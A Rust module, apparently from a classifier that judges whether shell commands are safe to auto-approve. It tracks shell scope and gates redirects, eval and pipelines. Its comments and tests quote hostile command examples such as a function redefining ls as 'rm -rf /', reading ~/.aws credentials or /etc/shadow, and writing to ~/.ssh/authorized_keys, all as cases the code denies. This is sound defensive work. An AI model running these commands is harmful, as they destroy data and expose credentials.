pub(super) use super::classify_budget::ClassifyGuard;
pub(crate) use super::classify_budget::charge_classify_work;
pub(crate) use super::functions::names_a_function;
use super::functions::{FuncScope, define_function};
pub(super) use super::functions::{forget_poisoned_functions, lookup_function, poison_function};
pub(super) use super::scope_budget::scope_budget_spent;
use super::scope_budget::{ScopeWalk, UNCERTAIN_VALUE, rebind_uncertain};
use super::*;
use crate::parse::Token;
use crate::verdict::{SafetyLevel, Verdict};
use crate::{handlers, pathctx::judging};

pub fn command_verdict(input: &str) -> Verdict {
    let _rules = crate::allowlist::suspended();
    let Some(_guard) = ClassifyGuard::enter(input.len()) else {
        return Verdict::Denied; // classification budget spent — fail closed
    };
    let Some(script) = parse(input) else {
        return Verdict::Denied;
    };
    let verdict = script_verdict(&script);
    if super::scope_budget::walk_untrusted() {
        return Verdict::Denied; // shell state the walk could not track — fail closed
    }
    verdict
}

pub fn is_safe_command(input: &str) -> bool {
    command_verdict(input).is_allowed()
}

pub(super) fn script_verdict(script: &Script) -> Verdict {
    walk_with_scope(script, |stmt| pipeline_verdict(&stmt.pipeline))
        .into_iter()
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine)
}

/// Walk `script`'s statements IN ORDER, running `per_stmt` on each with the accumulated scope
/// installed, and return the per-statement results.
///
/// The scope is: the running `cwd` (HP-19 — a later relative path resolves against a prior `cd`),
/// plus `VAR=value` bindings and function definitions from EARLIER statements (bash semantics;
/// released when this returns). Fail-open on cwd: an unresolvable `cd` leaves it unchanged.
///
/// Shared by `script_verdict` AND the explainer so both see the SAME scope. This is load-bearing for
/// security: a definition that shadows a builtin (`ls(){ rm -rf /; }; ls`) must deny in BOTH — if the
/// per-segment explain classified the `ls` call without the definition in scope, the hook's coverage
/// fallback (which uses the explainer) would re-allow the very thing the whole-command verdict denied.
pub(crate) fn walk_with_scope<T>(script: &Script, mut per_stmt: impl FnMut(&Stmt) -> T) -> Vec<T> {
    let _walk = ScopeWalk::enter();
    let mut running = crate::pathctx::cwd();
    let mut _vars: Vec<crate::pathctx::VarGuard> = Vec::new();
    let mut _funcs: Vec<FuncScope> = Vec::new();
    let mut out = Vec::with_capacity(script.0.len());
    for stmt in &script.0 {
        out.push({
            let _cwd = crate::pathctx::enter_cwd(running.clone());
            per_stmt(stmt)
        });
        let effects = if scope_budget_spent() { ShellEffects::default() } else { shell_effects(&stmt.pipeline) };
        let next = super::cd::cd_target(&stmt.pipeline).and_then(|(t, p)| crate::pathctx::join_cwd_mode(running.as_deref(), &t, p));
        if next.is_some() {
            running = next;
        } else if effects.cwd {
            // The shell may have moved somewhere we cannot name — a `cd` inside a compound or a
            // called function, or a bare `cd`/`cd -`. Keeping the old cwd would judge later
            // relative paths against a directory the shell has left.
            running = Some(crate::pathctx::UNRESOLVED_CWD.to_string());
        }
        for (name, value) in statement_assignments(&stmt.pipeline) {
            _vars.push(crate::pathctx::enter_var(name, value));
        }
        // Rebinds the shell keeps but we cannot attribute — a `VAR=…` or `name() {…}` inside a
        // compound or a called function. Pushed AFTER the precise bindings above so the uncertain
        // value wins for that name; a statement handled precisely contributes nothing here.
        rebind_uncertain(effects.vars, &mut _vars);
        for name in effects.funcs {
            poison_function(name);
        }
        if let [Cmd::FunctionDef { name, body }] = stmt.pipeline.commands.as_slice() {
            _funcs.push(define_function(name.clone(), body.clone()));
        }
    }
    out
}

/// How deep to chase function bodies. Bounded so a recursive definition cannot spin; hitting the
/// bound reports a possible effect, which fails closed.
pub(super) const MAX_CD_SCAN_DEPTH: usize = 16;

/// What running a statement may do to the CURRENT shell's state that we cannot attribute exactly.
///
/// bash isolates such effects in exactly two places — a SUBSHELL, and a stage of a multi-command
/// pipeline. Everywhere else (brace group, `if`, `for`, `while`, `case`, a called function) a `cd`,
/// a `VAR=…` or a `name() {…}` takes effect in the current shell and outlives the construct. The
/// precise handling matches only statement-level forms, so all of those escaped tracking:
/// `{ cd ~/.aws; }; cat credentials` was judged as a worktree read, and
/// `VAR=./ok; { VAR=/etc/shadow; }; cat $VAR` kept the stale binding. Both are fail-OPEN — the
/// stale state is the permissive one.
///
/// Whether the effect happened is unknowable (a branch may not be taken, a loop may not run), so
/// the caller marks the cwd and the named bindings UNCERTAIN rather than guessing a value.
#[derive(Default)]
pub(super) struct ShellEffects {
    pub(super) cwd: bool,
    pub(super) vars: Vec<String>,
    pub(super) funcs: Vec<String>,
}

/// The effects of one statement.
fn shell_effects(pipeline: &Pipeline) -> ShellEffects {
    let mut out = ShellEffects::default();
    // `seen` memoizes function bodies. Without it `f0(){ f1; f1; }; f1(){ f2; f2; }; …` costs
    // 2^depth traversals — a depth cap bounds depth but not FAN-OUT, the same blow-up the
    // classifier's own work budget exists for. Caught by the termination guard.
    let mut seen = Vec::new();
    pipeline_effects(pipeline, MAX_CD_SCAN_DEPTH, &mut seen, &mut out);
    out
}

/// A lone command's effects, or a pipeline's last stage's: zsh, and bash with `lastpipe`, run the
/// last stage in the current shell, so `echo x | read f` may set `f`. A bare assignment or a
/// definition there is an effect too, since `statement_assignments` binds only a lone one.
fn pipeline_effects(pipeline: &Pipeline, depth: usize, seen: &mut Vec<String>, out: &mut ShellEffects) {
    let Some(last) = pipeline.commands.last() else { return };
    if pipeline.commands.len() > 1 {
        match last {
            Cmd::Simple(s) if s.words.is_empty() => out.vars.extend(s.env.iter().map(|(name, _)| name.clone())),
            Cmd::FunctionDef { name, .. } => out.funcs.push(name.clone()),
            _ => {}
        }
    }
    scan_effects(last, depth, seen, out);
}

fn scan_effects(cmd: &Cmd, depth: usize, seen: &mut Vec<String>, out: &mut ShellEffects) {
    let Some(depth) = depth.checked_sub(1) else {
        out.cwd = true; // out of budget — assume the worst
        return;
    };
    match cmd {
        Cmd::Simple(s) => {
            let Some(name) = s.words.first().map(Word::eval) else {
                return; // a bare `VAR=x` — handled precisely by `statement_assignments`
            };
            out.vars.extend(super::opaque::declared_names(s));
            if name == "cd" {
                out.cwd = true;
                return;
            }
            // A CALL runs the body in THIS shell, so its effects escape with it.
            if seen.contains(&name) {
                return;
            }
            if let Some(body) = lookup_function(&name) {
                seen.push(name);
                scan_script_effects(&body, depth, seen, out);
            }
        }
        // The two constructs the shell really does isolate, plus forms that run nothing.
        Cmd::Subshell { .. } | Cmd::DoubleBracket { .. } | Cmd::FunctionDef { .. } => {}
        Cmd::BraceGroup { body, .. } => scan_script_effects(body, depth, seen, out),
        Cmd::For { var, body, .. } => {
            out.vars.push(var.clone());
            scan_script_effects(body, depth, seen, out);
        }
        Cmd::While { cond, body, .. } | Cmd::Until { cond, body, .. } => {
            scan_script_effects(cond, depth, seen, out);
            scan_script_effects(body, depth, seen, out);
        }
        Cmd::If { branches, else_body, .. } => {
            for b in branches {
                scan_script_effects(&b.cond, depth, seen, out);
                scan_script_effects(&b.body, depth, seen, out);
            }
            if let Some(e) = else_body {
                scan_script_effects(e, depth, seen, out);
            }
        }
        Cmd::Case { arms, .. } => {
            for a in arms {
                scan_script_effects(&a.body, depth, seen, out);
            }
        }
    }
}

/// Every statement of a body that the shell would run in the current shell: its assignments and
/// function definitions rebind here, and its commands are scanned in turn.
pub(super) fn scan_script_effects(script: &Script, depth: usize, seen: &mut Vec<String>, out: &mut ShellEffects) {
    for st in &script.0 {
        for (name, _) in statement_assignments(&st.pipeline) {
            out.vars.push(name);
        }
        if let [Cmd::FunctionDef { name, .. }] = st.pipeline.commands.as_slice() {
            out.funcs.push(name.clone());
        }
        pipeline_effects(&st.pipeline, depth, seen, out);
    }
}

/// The persistent bindings a STATEMENT establishes: a pure assignment `VAR=value` (a simple command
/// with env and NO words). A prefix `VAR=x cmd` is excluded — per bash it doesn't persist and
/// doesn't even affect `$VAR` in `cmd`'s own args. Each value is resolved against the bindings so far
/// (so `B=$A/x` chains); a CERTAIN literal binds verbatim, an uncertain one binds the sentinel.
fn statement_assignments(pipeline: &Pipeline) -> Vec<(String, String)> {
    let [Cmd::Simple(s)] = pipeline.commands.as_slice() else {
        return Vec::new();
    };
    if !s.words.is_empty() {
        return Vec::new();
    }
    s.env.iter().map(|(name, value)| (name.clone(), certain_value(value))).collect()
}

/// A word's CERTAIN literal value for binding, or the unpinnable sentinel when uncertain. Resolves
/// `$refs` against the current scope first, then requires no residual `$` and no substitution
/// sentinel — a substitution (`$(…)`), an unbound var, or a reassignment-to-uncertain all fail here.
pub(super) fn certain_value(word: &Word) -> String {
    let text = word.eval();
    if crate::pathctx::names_a_loop_var(&text) {
        return UNCERTAIN_VALUE.to_string();
    }
    let raw = crate::pathctx::expand_vars(&text, false).into_owned();
    // A TAGGED substitution sentinel is certain enough to BIND: it already classifies to a known
    // locus, so `OUT=$(pwd); … > "$OUT/raw/x"` gates the write at the worktree rather than
    // fail-closing on a value it can in fact bound. Every other marker stays uncertain.
    if raw.contains('$') || is_opaque_value(&raw) { UNCERTAIN_VALUE.to_string() } else { raw }
}

/// Whether an evaluated word carries a marker the classifier CANNOT bound: the opaque command
/// substitution, a process substitution (a `/dev/fd` pipe), or arithmetic. Deliberately not a
/// `__SAFE_CHAINS_` prefix test, which would also catch the tagged (bounded) substitution.
pub(crate) fn is_opaque_value(raw: &str) -> bool {
    ["__SAFE_CHAINS_CMDSUB__", "__SAFE_CHAINS_PROCSUB__", "__SAFE_CHAINS_ARITH__"]
        .iter()
        .any(|m| raw.contains(m))
}

#[cfg(test)]
pub(crate) fn is_safe_script(script: &Script) -> bool {
    script_verdict(script).is_allowed()
}

pub(crate) fn pipeline_verdict(pipeline: &Pipeline) -> Verdict {
    let mut acc = Verdict::Allowed(SafetyLevel::Inert);
    // The representative path-locus of the CURRENT stream (the previous stage's stdout), threaded so
    // a line-preserving filter carries the producer's locus THROUGH it: in `find ./src | head | xargs
    // cat`, `head`'s output items are still `find`'s worktree paths, so `xargs` gates them there
    // instead of worst-casing. In `A | xargs CMD`, xargs injects A's items as CMD's operands (the
    // same idea as `find -exec`'s `{}` binding, sourced from the pipe).
    let (mut stream, mut items): (Option<String>, _) = (None, crate::pathctx::item_shape::UNKNOWN);
    for (stage, cmd) in pipeline.commands.iter().enumerate() {
        let _stdin = stream.clone().map(|r| super::opaque::enter_stdin(r, items));
        acc = acc.combine(super::netargs::with_stdin(pipeline, stage, || cmd_verdict(cmd)));
        items = super::opaque::stage_shape(cmd, items);
        if stage + 1 < pipeline.commands.len() {
            stream = Some(stage_output_repr(cmd, stream.as_deref()));
        }
    }
    acc
}

/// The sentinel operand fed to an injecting consumer when the source is unknown/unmodeled. The
/// leading `/` makes it LOOK like a path (so `pathgate`-gated readers like `od` gate it) and the
/// cmdsub marker makes it unpinnable (so engine-resolved readers like `cat` worst-case it) — it
/// must deny in BOTH gate layers.
pub(super) const UNKNOWN_ITEM: &str = "/__SAFE_CHAINS_CMDSUB__";

/// A representative PATH for the items `cmd` emits on stdout given the stream repr it RECEIVED
/// (`input`), used to gate an operand-injecting consumer downstream (`… | xargs cat`). A PRODUCER
/// that provably emits workspace-bounded paths yields a worktree representative; a line-preserving
/// FILTER carries `input` through unchanged; everything else worst-cases to `UNKNOWN_ITEM`.
pub(super) fn stage_output_repr(cmd: &Cmd, input: Option<&str>) -> String {
    let Cmd::Simple(s) = cmd else {
        return UNKNOWN_ITEM.to_string();
    };
    let words: Vec<String> = s.words.iter().map(Word::eval).collect();
    let Some(first) = words.first() else {
        return UNKNOWN_ITEM.to_string();
    };
    let name = Token::from_raw(first.clone()).command_name().to_string();
    let args: Vec<&str> = words[1..].iter().map(String::as_str).collect();
    let through = || input.unwrap_or(UNKNOWN_ITEM).to_string();
    match name.as_str() {
        // find/fd emit paths UNDER their roots — the child of the worst root carries its locus.
        //
        // "Worst" by BOTH faces, not by whether the read is allowed. Selecting on whether the read is admitted
        // dropped any root that merely reads fine, so `find app/.git` fell through to `.` and
        // `find app/.git | while read f; do echo hi > "$f"; done` wrote into the frozen rung that
        // `echo hi > app/.git/config` refuses. `.git` is exactly the path that reads fine and must
        // not be written, so a read-face test could never see it.
        "find" | "fd" | "fdfind" if super::opaque::prints_only_paths(&args) => {
            let roots = find_roots(&args);
            let base = roots
                .iter()
                .max_by_key(|r| {
                    let (read, write) = (crate::engine::resolve::locus::read_locus(r), crate::engine::resolve::locus::write_locus(r));
                    read.max(write)
                })
                .copied()
                .unwrap_or(".");
            // Same stand-in the `-exec` handlers bind `{}` to — one rule, one definition. It was two
            // copies before, and the copy that got the shield fix was this one, so `find / | xargs
            // cat` refused while `find / -exec cat {} \;` read the same files.
            //
            // Deliberately not applied to the arms below. `echo /etc/passwd | xargs cat` keeps its
            // literal representative because the shield genuinely CAN check that one; the
            // distinction is whether we hold the actual path or a placeholder for it.
            crate::engine::resolve::frozen_reach::stage_item(&name, base, &args)
        }
        // ls emits cwd-relative BASENAMES (worktree) unless `-d` echoes its (possibly absolute) args.
        "ls" => {
            if super::echoed::ls_prints_operands(&args) {
                super::echoed::printed_item("ls", &args).unwrap_or_else(|| UNKNOWN_ITEM.to_string())
            } else {
                super::echoed::ls_item(&args).unwrap_or_else(|| UNKNOWN_ITEM.to_string())
            }
        }
        // echo/printf emit their args verbatim; the worst piece of them is the representative.
        "echo" | "printf" => super::echoed::printed_item(&name, &args).unwrap_or_else(|| UNKNOWN_ITEM.to_string()),
        // git path-listers emit repo-relative paths (worktree, assuming the repo is the workspace).
        "git" => match args.first() {
            Some(&"ls-files") | Some(&"diff") | Some(&"status") | Some(&"grep") => "sc_item".to_string(),
            _ => UNKNOWN_ITEM.to_string(),
        },
        // Line-preserving FILTERS: each output line is a WHOLE, unchanged input line, so the stream's
        // item locus is unchanged — carry `input` through. Only when reading stdin (no file operand)
        // and not byte-slicing (`head -c`, which can split a path); NOT `grep -o`/`sed`/`awk`/`cut`/`tr`
        // (they can rewrite a line to ANY path — treating those as passthrough would be a bypass).
        "sort" | "uniq" | "cat" | "tac" if !reads_a_file(&args) => through(),
        "head" | "tail" if !reads_a_file_after_count(&args) && !args.iter().any(|a| *a == "-c" || a.starts_with("--bytes")) => through(),
        // tee always forwards stdin→stdout (its file args are extra WRITES, gated elsewhere).
        "tee" => through(),
        _ => UNKNOWN_ITEM.to_string(),
    }
}

/// Whether a filter reads a FILE rather than stdin (so it is NOT a stdin passthrough): a
/// positional operand, or `sort`'s `--files0-from=F` / `--files0-from F`, which redirects it to
/// emit the CONTENTS of the files listed in `F` — arbitrary file-derived output, not the piped
/// stream. A lone `-` (explicit stdin) doesn't count. The `=`-glued flag form is a single token
/// starting with `-`, so it must be matched explicitly or it would masquerade as a passthrough.
fn reads_a_file(args: &[&str]) -> bool {
    args.iter()
        .any(|a| (!a.starts_with('-') && *a != "-") || *a == "--files0-from" || a.starts_with("--files0-from="))
}

/// Like `reads_a_file`, but skips the VALUE of `head`/`tail`'s count flags (`-n N`, `-c N`) so
/// `head -n 5` (stdin) isn't mistaken for reading a file named `5`.
fn reads_a_file_after_count(args: &[&str]) -> bool {
    let mut i = 0;
    while i < args.len() {
        let a = args[i];
        if matches!(a, "-n" | "-c" | "--lines" | "--bytes") {
            i += 2; // flag + its value
            continue;
        }
        if a.starts_with('-') || a == "-" {
            i += 1;
            continue;
        }
        return true; // a bare positional → a file operand
    }
    false
}

/// `find`'s root operands: after any leading global options (`-H`/`-L`/`-P`, `-D`/`-O V`), the
/// positional args up to the first predicate (`-name`, `(`, `!`, …). Defaults to `.` (cwd).
fn find_roots<'a>(args: &[&'a str]) -> Vec<&'a str> {
    let mut i = 0;
    while i < args.len() {
        match args[i] {
            "-H" | "-L" | "-P" => i += 1,
            "-D" | "-O" => i += 2,
            _ => break,
        }
    }
    let mut roots = Vec::new();
    while i < args.len() && !args[i].starts_with('-') && !matches!(args[i], "(" | "!" | ")" | ",") {
        roots.push(args[i]);
        i += 1;
    }
    if roots.is_empty() {
        roots.push(".");
    }
    roots
}

pub fn is_safe_pipeline(pipeline: &Pipeline) -> bool {
    pipeline_verdict(pipeline).is_allowed()
}

pub(crate) fn has_unsafe_syntax(cmd: &SimpleCmd) -> bool {
    !check_redirects(&cmd.redirs) || has_any_substitution(cmd)
}

fn has_any_substitution(cmd: &SimpleCmd) -> bool {
    cmd.words.iter().any(has_substitution) || cmd.env.iter().any(|(_, v)| has_substitution(v))
}

pub(crate) fn cmd_verdict(cmd: &Cmd) -> Verdict {
    match cmd {
        Cmd::Simple(s) => crate::allowlist::with_rules(s, simple_verdict),
        Cmd::Subshell { body, redirs } | Cmd::BraceGroup { body, redirs } => {
            let body_v = script_verdict(body);
            if let Verdict::Denied = body_v {
                return Verdict::Denied;
            }
            let redir_v = redirect_verdict(redirs);
            if let Verdict::Denied = redir_v {
                return Verdict::Denied;
            }
            body_v.combine(redir_v)
        }
        Cmd::For { var, items, body, redirs } => super::loops::for_verdict(var, items, body, redirs),
        Cmd::While { cond, body, redirs } | Cmd::Until { cond, body, redirs } => super::loops::while_verdict(cond, body, redirs),
        Cmd::If { branches, else_body, redirs } => {
            let redir_v = redirect_verdict(redirs);
            if let Verdict::Denied = redir_v {
                return Verdict::Denied;
            }
            let mut v = redir_v;
            for b in branches {
                v = v.combine(script_verdict(&b.cond)).combine(script_verdict(&b.body));
            }
            if let Some(eb) = else_body {
                v = v.combine(script_verdict(eb));
            }
            v
        }
        Cmd::DoubleBracket { words, redirs } => super::arith::double_bracket_verdict(words).combine(redirect_verdict(redirs)),
        // Which arm runs is decided at runtime, so — exactly as for `If` — every arm body counts
        // and the case is only as safe as its worst arm. The patterns are matched, never executed,
        // but the SUBJECT is expanded, so its substitutions are gated like any other word.
        Cmd::Case { subject, arms, redirs } => {
            let redir_v = redirect_verdict(redirs);
            if let Verdict::Denied = redir_v {
                return Verdict::Denied;
            }
            let mut v = redir_v.combine(word_sub_verdict(subject));
            for arm in arms {
                v = v.combine(words_sub_verdict(&arm.patterns)).combine(script_verdict(&arm.body));
            }
            v
        }
        Cmd::FunctionDef { name, body } => super::functions::definition_verdict(name, body),
    }
}

pub(crate) fn is_safe_cmd(cmd: &Cmd) -> bool {
    cmd_verdict(cmd).is_allowed()
}

fn part_sub_verdict(part: &WordPart) -> Verdict {
    match part {
        WordPart::CmdSub(inner) | WordPart::ProcSub(inner) => crate::allowlist::outside_rules(|| script_verdict(inner)),
        WordPart::Backtick(raw) => command_verdict(&super::escape::backtick_command(raw)),
        WordPart::DQuote(inner) => word_sub_verdict(inner),
        // Arithmetic is inert, but a `$( )` inside it runs — judged, not skipped.
        WordPart::Arith(inner) => word_sub_verdict(inner),
        _ => Verdict::Allowed(SafetyLevel::Inert),
    }
}

fn word_sub_verdict(word: &Word) -> Verdict {
    word.0.iter().map(part_sub_verdict).fold(super::arith::word_verdict(word), Verdict::combine)
}

pub(super) fn words_sub_verdict(words: &[Word]) -> Verdict {
    words.iter().map(word_sub_verdict).fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine)
}

#[cfg(test)]
pub(crate) fn word_subs_safe(word: &Word) -> bool {
    word_sub_verdict(word).is_allowed()
}

fn simple_verdict(cmd: &SimpleCmd) -> Verdict {
    let redir_v = redirect_verdict(&cmd.redirs);
    if let Verdict::Denied = redir_v {
        return Verdict::Denied;
    }

    let env_sub_v = cmd
        .env
        .iter()
        .map(|(_, v)| word_sub_verdict(v))
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine);
    let word_sub_v = words_sub_verdict(&cmd.words);

    // A LISTED assignment is classified by its value (`envvars.toml`): `GIT_SSH_COMMAND` carries a
    // command, `LD_PRELOAD` a path supplying code. An unlisted name is Inert, so this changes
    // nothing for ordinary invocations — `FOO=bar ls` classifies exactly as `ls` does.
    //
    // COMBINED, not merely checked for denial. An assignment that resolves to a LEVEL carries that
    // level into the command: `RUSTFLAGS='-Cincremental=./x'` authorises a worktree write, so the
    // invocation is a write even when the command word is inert. Propagating only `Denied` here
    // meant `RUSTFLAGS='-Cincremental=./x' echo hi` passed at `paranoid`, while the same write
    // spelled `touch ./x` did not.
    let env_name_v = cmd
        .env
        .iter()
        .map(|(name, value)| crate::envvars::assignment_verdict(name, &value.eval()))
        .fold(crate::envvars::rebinding_verdict(&cmd.words).combine(super::arith::command_verdict(cmd)), Verdict::combine);
    let sub_v = env_sub_v.combine(word_sub_v).combine(env_name_v);

    if let Verdict::Denied = sub_v {
        return Verdict::Denied;
    }

    if cmd.words.is_empty() {
        if cmd.env.is_empty() {
            return Verdict::Allowed(SafetyLevel::Inert);
        }
        return sub_v.combine(redir_v);
    }

    let name = cmd.words[0].eval();

    // A function shadows everything it names, builtins like `eval` included, so it resolves first.
    if let Some(call) = super::functions::call_verdict(cmd, &name) {
        return sub_v.combine(call).combine(redir_v);
    }

    if name == "eval" {
        return eval_verdict(cmd).combine(sub_v).combine(redir_v);
    }

    // Brace-expand each word (`cat {/etc/shadow,x}` → two operands) so every alternative bash
    // would run is classified — a braced word must not hide a system path from the gate.
    let words: Vec<Vec<Token>> = cmd.words.iter().map(|w| w.expand().into_iter().map(Token::from_raw).collect()).collect();
    if words.iter().all(Vec::is_empty) {
        return Verdict::Allowed(SafetyLevel::Inert);
    }
    if super::opaque::smuggles_a_flag(cmd) {
        return Verdict::Denied;
    }

    let cmd_v = super::netargs::with_args(cmd, || super::opaque::probed_verdict(cmd, &words, judging(!cmd.env.is_empty(), leaf_verdict)));
    sub_v.combine(cmd_v).combine(redir_v)
}

/// The command leaf's verdict. The behavioral-capability engine is authoritative for every
/// command it can resolve; the legacy classifier handles the rest (`…-engine` §4). There is
/// no opt-out — the engine is the default and only path.
fn leaf_verdict(tokens: &[Token]) -> Verdict {
    let legacy = handlers::dispatch(tokens);
    super::netargs::with_egress(tokens, crate::engine::bridge::gated_engine_verdict(tokens).unwrap_or(legacy))
}

fn eval_verdict(cmd: &SimpleCmd) -> Verdict {
    if cmd.words.len() < 2 {
        return Verdict::Denied;
    }
    for arg in &cmd.words[1..] {
        if !arg_is_eval_safe(arg) {
            return Verdict::Denied;
        }
    }
    Verdict::Allowed(SafetyLevel::Inert)
}

fn arg_is_eval_safe(word: &Word) -> bool {
    let mut found_safe = false;
    for part in &word.0 {
        match part {
            WordPart::Lit(s) | WordPart::SQuote(s) => {
                if !s.chars().all(char::is_whitespace) {
                    return false;
                }
            }
            WordPart::Escape(c) => {
                if !c.is_whitespace() {
                    return false;
                }
            }
            WordPart::CmdSub(script) => {
                if !script_yields_eval_safe(script) {
                    return false;
                }
                found_safe = true;
            }
            WordPart::Backtick(raw) => {
                let Some(script) = parse(&super::escape::backtick_command(raw)) else {
                    return false;
                };
                if !script_yields_eval_safe(&script) {
                    return false;
                }
                found_safe = true;
            }
            WordPart::DQuote(inner) => {
                if !arg_is_eval_safe(inner) {
                    return false;
                }
                if has_substitution(inner) {
                    found_safe = true;
                }
            }
            WordPart::ProcSub(_) | WordPart::Arith(_) | WordPart::AnsiC(_) => return false,
        }
    }
    found_safe
}

fn script_yields_eval_safe(script: &Script) -> bool {
    if script.0.len() != 1 {
        return false;
    }
    let stmt = &script.0[0];
    if !matches!(stmt.op, None | Some(ListOp::Semi)) {
        return false;
    }
    let pipeline = &stmt.pipeline;
    if pipeline.bang || pipeline.commands.len() != 1 {
        return false;
    }
    let Cmd::Simple(s) = &pipeline.commands[0] else {
        return false;
    };
    if !s.env.is_empty() {
        return false;
    }
    // A redirect inside the substitution is allowed only if it's inert:
    // stderr suppression (`2>/dev/null`), an fd dup (`2>&1`), or `/dev/null`.
    // A redirect that writes a real file is SafeWrite, not inert, so
    // `mise activate bash > evil` is rejected — eval-safe must not gain a
    // file-write side effect, and diverting stdout to a file is pointless here.
    if redirect_verdict(&s.redirs) != Verdict::Allowed(SafetyLevel::Inert) {
        return false;
    }
    for w in &s.words {
        if !word_is_plain_literal(w) {
            return false;
        }
    }
    let tokens: Vec<Token> = s.words.iter().flat_map(|w| w.expand().into_iter().map(Token::from_raw)).collect();
    if tokens.is_empty() {
        return false;
    }
    crate::registry::is_eval_safe_invocation(&tokens)
}

/// True iff every character of `word` is drawn from the bare-literal
/// alphabet: ASCII alphanumerics plus `_`, `-`, `.`, `/`, `=`. Words
/// matching this shape consist entirely of identifier-style or
/// path-style tokens that the shell will pass through to the
/// substituted command unchanged at runtime.
///
/// Required for words inside eval-safe substitutions because the
/// "stdout is shell-init code" trust depends on the contributor having
/// vetted what gets passed to the tool. Restricting the alphabet to
/// chars with no shell-expansion semantics keeps the substituted
/// invocation static across parse-time and runtime — what you see in
/// the source is what the tool receives.
fn word_is_plain_literal(word: &Word) -> bool {
    word.0.iter().all(part_is_plain_literal)
}

fn part_is_plain_literal(part: &WordPart) -> bool {
    match part {
        WordPart::Lit(s) | WordPart::SQuote(s) => s.chars().all(is_bare_literal_char),
        WordPart::Escape(c) => is_bare_literal_char(*c),
        WordPart::DQuote(inner) => word_is_plain_literal(inner),
        WordPart::CmdSub(_) | WordPart::ProcSub(_) | WordPart::Backtick(_) | WordPart::Arith(_) | WordPart::AnsiC(_) => false,
    }
}

/// Bare-literal alphabet: ASCII alphanumerics plus a tight punctuation
/// set covering identifiers (`_`, `-`), versions / paths (`.`, `/`),
/// and the long-flag value form (`=`). New chars require an explicit
/// eval-safe use case — add by extending this match, never by
/// excluding individual hostile chars.
fn is_bare_literal_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | '/' | '=')
}

/// Whether a command's redirects are acceptable on the USER-ALLOWLIST path — the one taken when the
/// user's own `Bash(...)` rule names a command safe-chains does not otherwise know.
///
/// Delegates to [`redirect_verdict`], the same location model every other redirect goes through.
/// It used to carry its own rule — a write was accepted only to `/dev/null`, a read always — and
/// that second copy was wrong in BOTH directions:
///
/// - Too strict on writes. A granted runner script could not redirect anywhere, not even into the
///   session scratchpad: `~/runner-scripts/x.sh > $SCRATCH/out.txt` fell through to a prompt while
///   the byte-identical `cat f > $SCRATCH/out.txt` auto-approved through the engine path.
/// - Too lax on reads. `Redir::Read` was unconditionally true, so `~/runner-scripts/x.sh <
///   /etc/shadow` fed a credential to a granted command without ever consulting the read locus.
///
/// One model, one answer. A grant covers the command; the redirect is still gated by where it
/// lands, so `> ~/.ssh/authorized_keys` stays denied whatever rule named the command.
pub(crate) fn check_redirects(redirs: &[Redir]) -> bool {
    redirect_verdict(redirs).is_allowed()
}

/// Whether a redirect *write* target is one we can auto-approve. Delegates to the SAME location
/// model + user grants the engine's file writers (`cp`/`mv`/`tee`/…) use, so a `> ~/file` honors
/// a home grant exactly like `cp ./a ~/file`; `/tmp` and `/dev/stdout` stay writable; and
/// `.git`/`.envrc`, home, absolute system paths, `..` escapes, and `$`-unpinnable targets stay
/// frozen (a redirect there can plant a git hook, an SSH key, or a direnv script that runs
/// later). Relative targets resolve against the harness cwd/root inside `write_target_verdict`.
fn is_safe_write_target(path: &str) -> bool {
    crate::engine::resolve::write_target_verdict(path).is_allowed()
}

/// The verdict for a redirect that OPENS `target` for writing. Brace sequences expand first.
fn write_face(target: &Word) -> Verdict {
    super::eval::judge_write(target, is_safe_write_target)
}

/// The verdict for a redirect that OPENS `target` for reading. Gates the SOURCE by its read locus,
/// like an operand read: `cat < /etc/shadow` must deny just as `cat /etc/shadow` does. A
/// substitution-derived source names an unknowable file → fail-closed to Denied. Brace sequences
/// expand first, and the locus is read off that expanded spelling.
fn read_face(target: &Word) -> Verdict {
    super::eval::judge_read(target, is_opaque_value)
}

pub(crate) fn redirect_verdict(redirs: &[Redir]) -> Verdict {
    let mut level = Verdict::Allowed(SafetyLevel::Inert);
    for r in redirs {
        match r {
            Redir::Write { target, .. } => {
                level = level.combine(word_sub_verdict(target));
                level = level.combine(write_face(target));
            }
            Redir::Read { target, .. } => {
                level = level.combine(word_sub_verdict(target));
                level = level.combine(read_face(target));
            }
            // `<>` opens the target BOTH ways, so it takes both gates. Taking only one would let
            // the other face through: the write gate alone misses reading a secret, and the read
            // gate alone misses overwriting a file that is merely readable.
            Redir::ReadWrite { target, .. } => {
                level = level.combine(word_sub_verdict(target));
                level = level.combine(write_face(target));
                level = level.combine(read_face(target));
            }
            Redir::HereStr(word) => {
                level = level.combine(word_sub_verdict(word));
            }
            // A heredoc body is inert ONLY behind a quoted delimiter. With a bare `<<EOF` the shell
            // expands the body, so a substitution in it runs and is classified exactly like one in
            // any other word. `body` is empty for the quoted spellings, so this is a no-op there.
            Redir::HereDoc { body, .. } => {
                level = level.combine(word_sub_verdict(body));
            }
            Redir::DupFd { .. } => {}
        }
    }
    level
}

fn has_substitution(word: &Word) -> bool {
    word.0.iter().any(|p| match p {
        WordPart::CmdSub(_) | WordPart::ProcSub(_) | WordPart::Backtick(_) | WordPart::Arith(_) => true,
        WordPart::DQuote(inner) => has_substitution(inner),
        _ => false,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn check(cmd: &str) -> bool {
        is_safe_command(cmd)
    }

    #[test]
    fn a_function_defined_in_a_subshell_is_gone_when_it_ends() {
        assert!(check("(ls(){ rm -rf /; }; true); ls"), "the subshell's `ls` is not the one run after it");
        assert!(!check("(ls(){ rm -rf /; }; ls)"), "inside the subshell it is");
    }

    #[test]
    fn a_name_defined_in_an_ended_scope_is_not_trusted_as_a_number() {
        assert!(check("n=$(date +%s); echo $((n+1))"));
        assert!(
            !check("(date(){ echo x; }; true); n=$(date +%s); echo $((n+1))"),
            "a name defined anywhere in the line is not trusted, whatever scope defined it"
        );
    }

    #[test]
    fn an_argument_that_may_split_moves_every_later_one_to_an_unknown_place() {
        assert!(check("f(){ cat \"$2\"; }; f a ./ok"));
        assert!(check("f(){ cat \"$2\"; }; f \"$X\" ./ok"), "quoted, it stays one word");
        assert!(check("f(){ cat \"$2\"; }; IFS=,; f a ./ok"));
        let moved = [
